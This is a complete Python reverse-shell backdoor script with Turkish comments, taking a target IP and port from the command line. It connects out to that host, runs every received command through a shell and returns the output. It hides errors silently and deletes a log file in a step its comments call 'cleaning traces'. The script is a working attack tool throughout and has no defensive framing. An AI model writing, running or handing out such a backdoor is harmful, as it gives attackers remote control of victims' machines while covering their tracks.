import socket
import subprocess
import os
import sys

def setup_backdoor(target_ip, port):
    try:
        # Backdoor oluşturma (örnek olarak bir reverse shell)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.send(b"Backdoor baslatildi.\n")
        
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            else:
                output = subprocess.getoutput(command)
                s.send(output.encode())
        
        s.close()
    except Exception:
        pass  # Hataları sessizce geç

def clean_up(ip_file):
    # IP adresini temizleme (unutma)
    if os.path.exists(ip_file):
        os.remove(ip_file)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Kullanım: python setup_backdoor.py <hedef_ip> <port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    port = int(sys.argv[2])

    # IP adresini kaydetme
    ip_file = "ip_log.txt"
    with open(ip_file, "w") as f:
        f.write(target_ip)

    # Backdoor'u başlat
    setup_backdoor(target_ip, port)

    # İzleri temizle
    clean_up(ip_file)